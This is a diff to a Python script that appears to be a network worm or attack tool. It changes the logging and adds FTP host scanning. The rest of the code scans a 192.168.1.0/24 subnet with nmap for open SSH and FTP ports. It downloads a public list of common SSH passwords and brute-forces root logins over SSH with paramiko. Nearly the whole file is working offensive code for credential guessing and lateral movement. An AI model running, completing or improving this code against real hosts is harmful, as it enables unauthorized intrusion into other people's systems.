@@ -7,29 +7,18 @@
 import nmap
 import paramiko
 import os
-import logging
+import coloredlogs, logging
 import socket
 from urllib.request import urlopen
 import urllib
 import time
 from ftplib import FTP
 import ftplib
+
 # ------------------- Logging ----------------------- #
 logger = logging.getLogger(__name__)
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-                    level=logging.INFO)
-debug = True  # Set this to True to see debug messages
+coloredlogs.install(level='DEBUG', logger=logger)
 # --------------------------------------------------- #
-
-def debug_print(text):
-    """
-    Prints debug messages only when debug mode is activated.
-
-    Args:
-        text: string
-    """
-    if debug:
-        print("[?] " + text)
 
 
 def get_private_ip():
@@ -40,9 +29,9 @@ def get_private_ip():
     Returns:
         private IP address
     """
-    debug_print("Getting private IP")
+    logger.debug("Getting private IP")
     ip = socket.gethostbyname(socket.gethostname())
-    debug_print("IP: " + ip)
+    logger.debug("IP: " + ip)
     return ip
 def get_public_ip():
     """
@@ -52,7 +41,7 @@ def get_public_ip():
     Returns:
         public IP address
     """
-    debug_print("Getting public IP")
+    logger.debug("Getting public IP")
     import re
     data = str(urlopen('http://checkip.dyndns.com/').read())
     return re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)
@@ -66,13 +55,31 @@ def scan_ssh_hosts():
     Returns:
         IP addresses of hosts
     """
-    debug_print("Scanning machines on the same network with port 22 open.")
+    logger.debug("Scanning machines on the same network with port 22 open.")
 
     port_scanner = nmap.PortScanner()
     port_scanner.scan('192.168.1.0/24', arguments='-p 22 --open')
     all_hosts = port_scanner.all_hosts()
 
-    debug_print("Hosts: " + str(all_hosts))
+    logger.debug("Hosts: " + str(all_hosts))
+    return all_hosts
+
+
+def scan_ftp_hosts():
+    """
+    Scans all machines on the same network that
+     have FTP (port 21) enabled
+
+    Returns:
+        IP addresses of hosts
+    """
+    logger.debug("Scanning machines on the same network with port 21 open.")
+
+    port_scanner = nmap.PortScanner()
+    port_scanner.scan('192.168.1.0/24', arguments='-p 21 --open')
+    all_hosts = port_scanner.all_hosts()
+
+    logger.debug("Hosts: " + str(all_hosts))
     return all_hosts
 
 
@@ -87,10 +94,10 @@ def download_ssh_passwords(filename):
 
     # TODO: Move these passwords to my own website.
 
-    debug_print("Downloading passwords...")
+    logger.debug("Downloading passwords...")
     url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
     urllib.request.urlretrieve(url, filename)
-    debug_print("Passwords downloaded!")
+    logger.debug("Passwords downloaded!")
 
 
 def connect_to_ftp(host, username, password):
@@ -98,7 +105,8 @@ def connect_to_ftp(host, username, password):
     try:
         ftp = FTP(host)
         ftp.login(username, password)
-    except ftplib.all_errors:
+    except ftplib.all_errors as error:
+        logger.error(error)
         pass
 
 
@@ -120,18 +128,19 @@ def connect_to_ssh(host, password):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        debug_print("Connecting to: " + host)
+        logger.debug("Connecting to: " + host)
         client.connect(host, 22, "root", password)
-        debug_print("Successfully connected!")
+        logger.debug("Successfully connected!")
         return True
     except socket.error:
-        debug_print("Computer is offline or port 22 is closed")
+        logger.error("Computer is offline or port 22 is closed")
         return False
     except paramiko.ssh_exception.AuthenticationException:
-        debug_print("Wrong Password or Username")
+        logger.error("Wrong Password or Username")
         return False
     except paramiko.ssh_exception.SSHException:
         # socket is open, but not SSH service responded
+        logger.error("No response from SSH server")
         return False
 
 
@@ -151,3 +160,5 @@ def bruteforce_ssh(host, wordlist):
         print(connection)
         time.sleep(5)
 
+
+get_private_ip()
